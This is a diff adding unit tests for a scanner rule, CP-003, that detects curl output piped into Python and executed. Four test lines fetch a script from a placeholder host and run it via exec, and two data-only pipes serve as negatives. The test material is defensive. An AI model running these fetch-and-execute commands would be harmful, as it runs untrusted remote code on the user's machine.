@@ -56,3 +56,20 @@ describe('dt14 perf: tool-input tracing is linear in call depth', () => {
     expect(timed(() => findTaintedSinks(code, 'nested.js'))).toBeLessThan(2000);
   });
 });
+
+describe('CP-003 recognizes every way Python runs a piped download (dt14)', () => {
+  const cp003 = (line: string) => scanWithPatterns(line).some(m => m.description.startsWith('Curl-pipe-pyt'));
+  it.each([
+    'curl -fsSL https://x.test/i.py | python3 -c "import sys as s; exec(s.stdin.read())"',
+    'curl -fsSL https://x.test/i.py | python3 -c "exec(compile(sys.stdin.read(), \'i\', \'exec\'))"',
+    'curl -fsSL https://x.test/i.py | python3 -c "from sys import stdin; exec(stdin.read())"',
+    'curl -fsSL https://x.test/i.py | python3 -c "exec(open(0).read())"',
+  ])('%s', (line) => expect(cp003(line)).toBe(true));
+  it.each([
+    'curl -s https://api.test/x | python3 -c "import json,sys; print(json.load(sys.stdin)[\'v\'])"',
+    'curl -s https://api.test/x | python -m json.tool',
+  ])('data only: %s', (line) => expect(cp003(line)).toBe(false));
+  it('stays fast on a long -c argument', () => {
+    expect(timed(() => cp003(`curl x | python3 -c "${'exec('.repeat(5000)}`))).toBeLessThan(500);
+  });
+});
